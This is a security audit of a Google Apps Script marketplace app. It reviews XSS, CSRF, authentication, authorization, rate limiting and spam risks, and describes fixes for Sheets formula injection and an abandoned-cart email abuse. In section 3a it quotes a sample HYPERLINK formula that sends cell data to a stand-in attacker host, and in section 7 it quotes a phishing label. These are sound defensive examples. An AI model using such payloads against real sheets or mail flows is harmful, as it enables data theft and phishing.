# Security Audit

Date: 2026-08-05
Scope: full repo — `apps-script/*.gs` (backend) and `assets/js/*.js` + every
`.html` page (frontend). Read-only findings, cross-checked against the actual
source (no assumptions carried over from earlier design docs).

Per the request, this pass **fixes only Critical findings**; everything else
below is a documented recommendation awaiting approval before any code
changes are made.

## Severity legend

| Severity | Meaning |
|---|---|
| Critical | Exploitable by an anonymous/untrusted party today, with real damage (data exfiltration, phishing, abuse of the app's own identity) |
| High | Real risk, but needs specific conditions (a known username, a targeted victim) or has a meaningful mitigating factor |
| Medium | Real gap, limited blast radius (self-harm, cosmetic, resource abuse within a low ceiling) |
| Low / Informational | Theoretical or requires unrealistic effort to exploit |

---

## Summary table

| # | Category | Finding | Severity | Fixed this pass? |
|---|---|---|---|---|
| 1 | Input validation | Google Sheets formula/CSV injection via unsanitized free text written to cells | **Critical** | ✅ Yes |
| 2 | Spam prevention | Abandoned-cart reminder email: arbitrary destination address + attacker-controlled body content | **Critical** | ✅ Yes |
| 3 | Rate limiting | No login attempt throttling — unlimited password guesses against a known username | High | No |
| 4 | Spam prevention | `sendMessage`/`sendChatImage` unauthenticated with no per-token throttle — inbox/Drive-storage flooding | Medium | No |
| 5 | Spam prevention | `recordProductViews`/`recordStoreVisit` unauthenticated, unthrottled — trending-rank gaming | Medium | No |
| 6 | Input validation | No length caps on free-text fields (product name/description, store name, order notes, customer name) | Medium | No |
| 7 | Input validation | `actionUpdateOwnerProfile` doesn't re-run registration's email-format/duplicate checks | Medium | No |
| 8 | Authentication | Session-token / username string comparisons are non-constant-time | Low | No |
| 9 | XSS, CSRF, Authorization, Vendor isolation, Customer isolation | No findings — see detail below | — | N/A |

---

## 1. XSS — Cross-Site Scripting

**Result: no exploitable findings.**

- Every card/list renderer that builds HTML via template literals runs
  user-controlled fields through `escapeHtml()` (`helpers.js`) before
  interpolating — verified in `product-card.js`, `directory.js`, `search.js`,
  `home.js`, `owner-products.js`, `owner-orders.js`, `owner-messages.js`,
  `checkout.js`, `cart-page.js`.
- Chat message bodies (`chat-window.js`, `owner-messages.js`) are rendered
  via `textContent`, not `innerHTML` — immune to markup injection regardless
  of content.
- Image `src` attributes are set via DOM property assignment
  (`img.src = value`), not string concatenation into `innerHTML` — even an
  attacker-controlled URL can't break out of the attribute this way, and
  `<img src="javascript:...">` doesn't execute in browsers.
- `variantId`/`price` interpolated unescaped into `product-card.js`
  (`<option value="${v.variantId}">`, `data-price="${v.price}"`) looked
  suspicious at first glance, but both are server-derived: `price` is always
  passed through `Number()` before being returned to the client (Products.gs
  lines 56/185/245/287), and `variantId` is always a server-generated
  `newId('var')` value, never client-chosen even when a vendor's own crafted
  API call tries to set one — confirmed in `actionCreateOrUpdateProduct`
  (Products.gs:363–388). Not exploitable.
- No inline event handlers (`onclick="..."` with interpolated data) anywhere
  in the 12 HTML pages.

## 2. CSRF — Cross-Site Request Forgery

**Result: not applicable by design.**

- There is no cookie-based session anywhere in the app (`grep`-confirmed: no
  `document.cookie`, `Set-Cookie`, or `withCredentials` in the repo). The
  owner session token lives only in `localStorage` and is explicitly read and
  attached to each request body by same-origin JS (`auth.js`'s
  `Auth.getToken()`). A forged cross-origin request has no way to read that
  token or reproduce it in a request body — the two standard CSRF
  preconditions (ambient credentials + predictable request shape) don't hold.
- `doGet` (Code.gs) only routes to read-only actions (`listStores`,
  `listProducts`, `getStorePublicInfo`, `searchProducts`, `listTopProducts`,
  `listTopStores`) — no state-changing action is reachable via a GET request,
  so there's no "CSRF via `<img src>`/simple link" vector either.

## 3. Input validation

### 3a. Google Sheets formula/CSV injection — **Critical, fixed**

`Db.gs`'s `appendRowFromObject`/`updateRowFromObject` write every field
verbatim into Sheet cells, with no sanitization. Google Sheets — like Excel —
interprets a cell value beginning with `=`, `+`, `-`, or `@` as a formula,
including via `Range.setValue()`/`setValues()` calls made from Apps Script,
not just manual typing. A formula can call `IMPORTXML`/`IMPORTDATA` to make
outbound HTTP requests (exfiltrating adjacent cell data to an attacker's
server) or `HYPERLINK(...)` to render a deceptive clickable link — and it
executes the moment the store owner or Sheet admin opens the tab and looks at
the row.

This is reachable by **any anonymous customer**, no auth required, through
several free-text fields that flow straight into a cell: checkout's
`customerName`/`notes`/`island`/`village` (Orders.gs `actionCreateOrder`),
chat's message body and customer name (Chat.gs), and — from a malicious
vendor — product name/description. Example payload as a checkout "Order
Notes" value: `=HYPERLINK("http://attacker.example/log?d="&A2,"Click for tracking info")`.

**Fix applied**: `Db.gs` now force-prefixes any string value that begins with
a formula-trigger character with a leading `'` before writing it — the same
mechanism Sheets uses internally to mark a cell as explicit plain text, so
the value still displays exactly as typed (the apostrophe is not part of the
stored/displayed value) but is never evaluated as a formula. Applied once, in
`appendRowFromObject`/`updateRowFromObject`, so it covers every current and
future write through the app's one data-access chokepoint with no per-call-site
changes needed.

### 3b. No login attempt throttling — High, not fixed

`actionLoginOwner` (Auth.gs) has no lockout or delay after repeated failed
attempts against a known username — only the eventual 8-character minimum
password length stands between an attacker and a scripted dictionary attack.
(2FA-enabled accounts and the 2FA/reset code flow itself *do* have a 5-attempt
lockout — this gap is specifically the initial username+password check.)
A real fix needs a persisted failed-attempt counter with a cooldown, which is
a small but genuine design decision (how long to lock, whether to lock the
account or just slow it down, how it interacts with the timing-safe dummy-hash
check that already exists) — flagged for approval rather than bundled in as
a "critical" one-liner.

### 3c. No length caps on free-text fields — Medium, not fixed

Product name/description/category, store name, order notes/customer
name/island/village, and owner profile fields (Products.gs, Orders.gs,
Auth.gs) have no server-side maximum length (chat messages are the one
exception, already capped at 2000 chars). Not independently exploitable for
anything beyond oversized payloads/Sheet cell bloat, but worth capping
consistently (e.g. 200 chars for names, 2000 for free-text notes/descriptions)
the same way chat already is.

### 3d. `actionUpdateOwnerProfile` skips registration's validation — Medium, not fixed

`actionRegisterOwner` requires a non-blank, `@`-containing email and checks
for duplicate email/phone across all owners. `actionUpdateOwnerProfile`
(Products.gs:417) writes `body.email`/`body.phone` straight through with
none of those checks — an owner can blank out their own contact email
(silently breaking the auto-email-to-vendor order flow) or set it to a value
already used by another store (breaking the "email is unique" invariant the
rest of the app assumes). Scoped entirely to the owner's own row — not a
cross-vendor authorization issue — but a real data-integrity gap worth
closing by reusing the same validation `actionRegisterOwner` already has.

## 4. Authentication

- Passwords: salted SHA-256 + a Script Properties pepper. Already documented
  in the README as a deliberate, accepted tradeoff (Apps Script has no
  bcrypt/argon2) — not re-litigated here.
- Session tokens: `Utilities.getUuid() + Utilities.getUuid()` — 244 bits of
  entropy, effectively unguessable. Expiry enforced server-side on every
  `requireAuth()` call (Auth.gs:66).
- Login username-enumeration: correctly mitigated — `actionLoginOwner` hashes
  the submitted password against a dummy salt when the username doesn't
  exist, so response timing/content doesn't reveal account existence.
  `actionRequestPasswordReset` has the same shape-preserving behavior.
- 2FA codes: 10-minute expiry, 5-attempt lockout, one-time (row deleted on
  success or final failure) — correctly implemented, shared consistently
  across login 2FA, 2FA setup, and password reset (Auth.gs `consumeTwoFACode`).
- Password reset revokes all of that owner's existing sessions
  (`revokeAllSessions`) — correct, limits damage from a credential-stuffing
  reset.
- Logout deletes the server-side Sessions row, not just the client copy.
- Gap: no login-attempt throttling — see 3b above (cross-referenced as High,
  not Critical, since it requires a specific known username and 8+ char
  passwords are required).
- Low/informational: token and username comparisons (`Db.gs`'s
  `findRowById`, `actionLoginOwner`'s username lookup) use plain `===`, not a
  constant-time comparison. A timing side-channel to recover a 68-character
  session token or guess a username one character at a time is not
  practically exploitable over Apps Script's network latency and per-request
  execution overhead, but noted for completeness.

## 5. Authorization

**Result: no findings — every protected action checked is correctly scoped.**

Every `PROTECTED_POST_ACTIONS` handler receives its `owner` argument
server-derived from `requireAuth(body.token)` in Code.gs — never from a
client-supplied `ownerId`/ID field. Verified individually:

- `actionUpdateOwnerProfile`, `actionGetOwnerProfile`, `actionListOwnerProducts`,
  `actionListOwnerOrders`, `actionSetStoreStatus`, `actionEnable2FARequest`,
  `actionConfirm2FASetup`, `actionDisable2FA`, `actionGetUnreadCount` — all
  operate exclusively on the authenticated owner's own row/scope, no ID
  parameter can redirect them to another owner's data.
- `actionDeleteProduct`, `actionCreateOrUpdateProduct` (Products.gs),
  `actionUpdateOrderStatus` (Orders.gs), `actionUploadProductImage`,
  `actionUploadStoreLogo` (Images.gs), `actionDeleteConversation`,
  `actionArchiveConversation` (Chat.gs) — all look up the target row by ID
  and explicitly check `existing.OwnerId !== owner.OwnerId` (or equivalent)
  before allowing the mutation, rejecting with a generic "not found" (not
  "forbidden" — correctly avoids confirming the row's existence to a vendor
  who doesn't own it).
- `resolveChatRequest`'s vendor path (Chat.gs) — the shared entry point for
  `sendMessage`/`getConversation`/`markAsRead`/`sendChatImage` — does the same
  ownership check before letting a vendor token touch a conversation.

## 6. Rate limiting

**Result: none exists anywhere in the backend.** `LockService` (used
throughout) is a concurrency guard against double-writes, not a throttle —
confirmed by inspecting every `LockService`/`CacheService` usage in the
codebase; `CacheService` is exclusively the read-through cache added earlier
for list endpoints, also not a rate limiter.

This is a genuine, real limitation, but it's also a platform constraint:
Apps Script Web Apps have no built-in per-IP/per-token request throttling
primitive, and building one from scratch (a persisted counter + cooldown
window, keyed by IP or token, enforced via `CacheService` or a Sheet) is a
non-trivial design decision — how strict, what the lockout/cooldown shape is,
whether it risks blocking legitimate shared-IP mobile users (relevant for
this app's actual audience) — that deserves explicit approval rather than a
silent "critical" fix. Flagged here; the two concrete high-value places to
prioritize (if approved) are login attempts (3b above) and chat
sends (7 below).

## 7. Spam prevention

- **Abandoned-cart reminder email abuse — Critical, fixed.** See below.
- `sendMessage`/`sendChatImage`/`getConversation`/`markAsRead` are fully
  anonymous, public, and unthrottled — a script can flood a specific vendor's
  inbox with junk conversations, or (via `sendChatImage`) burn through Drive
  storage with junk uploads up to the configurable per-image size cap. Medium
  severity: annoying and resource-consuming, but bounded to one vendor's own
  inbox/storage per attack, doesn't touch other vendors or leak data, and the
  vendor can always Archive/Delete. Not fixed this pass — needs the same
  rate-limiting design conversation as 6 above.
- `recordProductViews`/`recordStoreVisit` are fully anonymous and unthrottled
  — trivially scriptable to inflate a product/store's view/visit count and
  distort the home page's "Trending Products"/"Popular Stores" carousels.
  Medium severity: cosmetic/ranking manipulation only, no data exposure, no
  resource exhaustion beyond a few extra cells being written. Not fixed.

### Abandoned-cart reminder email — Critical, fixed

`actionSaveAbandonedCart` (Reminders.gs) is public, unauthenticated, and
accepts an arbitrary `email` with no verification it belongs to the
requester, plus an arbitrary `items` array that was stored and later
replayed **verbatim** into the reminder email's body by `runReminderSweep` —
including each item's client-supplied `label` field, with no validation that
it corresponds to a real product.

Combined, this let anyone — with a single unauthenticated POST — make the
app send an email, from the store's own configured identity/sending quota,
to **any address they choose**, containing **attacker-chosen text** embedded
in the item list (e.g. a phishing line: `label: "URGENT - confirm payment at http://evil.example"`).
This is a spam-relay / phishing-content-injection primitive riding on a
legitimate store's name and Apps Script mail quota — clearly Critical:
trivially exploitable, no auth, real-world abuse value (spam relay, phishing,
reputational damage to the impersonated store).

**Fix applied**: `actionSaveAbandonedCart` now stores only
`{productId, variantId, qty}` per item — the client-supplied `label` is
dropped entirely, never persisted. `runReminderSweep` now re-derives each
item's display name from the live Products/Variants sheets by `productId`
(the same "never trust client text that gets echoed elsewhere" pattern
`actionCreateOrder` already uses for order confirmations), falling back to a
generic "an item" only if the product has since been deleted. The email can
still be sent to an arbitrary address with no ownership check on the email
itself — that residual risk is the same one described in section 6 (needs a
rate-limiting/anti-abuse design decision) and is called out again here for
visibility, not silently left out of scope.

## 8. Vendor isolation

**Result: no findings.** Covered in detail under Authorization (section 5) —
every action that reads or mutates a vendor-owned resource re-derives the
acting owner from the server-side token and checks row-level `OwnerId`
ownership before proceeding. No action accepts a client-supplied `ownerId`
that could redirect it to another vendor's data.

## 9. Customer isolation

**Result: no findings.**

- Cart data is pure `localStorage`, inherently scoped to one browser —
  no server round-trip, no cross-customer path at all.
- Chat identity (`customerToken`) is a `crypto.randomUUID()` — 122 bits of
  entropy, not practically guessable/enumerable — and every chat action
  matches strictly on `(storeSlug, customerToken)`, so one customer can't
  reach another's conversation without their token.
- There is no "look up an order by ID" endpoint reachable by a customer —
  `actionCreateOrder` is the only public order-touching action, and it only
  ever returns the order the caller just created, in that same response. A
  customer can't enumerate or view any other customer's order.

---

## What was fixed this pass

1. **`apps-script/Db.gs`** — `appendRowFromObject`/`updateRowFromObject` now
   sanitize every outgoing string value against Sheets formula injection
   (leading `'` prefix on any value starting with `=`, `+`, `-`, or `@`).
   This is a single, low-risk chokepoint fix: legitimate values are
   unaffected (displayed cell content is identical), and it also incidentally
   fixes today's existing behavior where a phone number starting with `+`
   could already be silently mis-parsed by Sheets' own auto-formula-detection.
2. **`apps-script/Reminders.gs`** — abandoned-cart items no longer trust a
   client-supplied display label; `runReminderSweep` re-derives real product
   names from Products/Variants before building the reminder email.

## What's next (needs your approval before any of this is touched)

- 3b — add login-attempt throttling.
- 3c — add consistent length caps on free-text fields.
- 3d — reuse registration's email validation/duplicate-check in
  `actionUpdateOwnerProfile`.
- 6/7 — a rate-limiting design for `sendMessage`/`sendChatImage`/
  `recordProductViews`/`recordStoreVisit` (and, if desired, a stricter
  guard on who `saveAbandonedCart` can email, beyond the content-injection
  fix already applied).
